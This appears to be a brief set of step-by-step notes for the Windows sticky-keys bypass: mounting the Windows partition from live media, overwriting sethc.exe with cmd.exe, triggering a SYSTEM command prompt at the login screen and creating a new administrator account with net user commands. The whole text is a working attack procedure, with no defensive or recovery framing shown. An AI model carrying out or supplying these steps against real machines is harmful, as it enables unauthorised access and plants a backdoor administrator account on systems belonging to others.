1. Mount the windows file system - mount [storage partition] [path]
 	mount /dev/sda2 /mnt
2. Navigate to the path containing the sethc.exe and cmd.exe - cd /mnt/windows/system32
3. Override the sticky keys file with the command line file - cp cmd.exe sethc.exe
4. Remove the optical drive attachment
5. Start the machine and trigger the sticky keys process by pressing shift 5 times
6. Create user with administrative privileges:
	net user [username] [password] /add
	net localgroup administrators [username] /add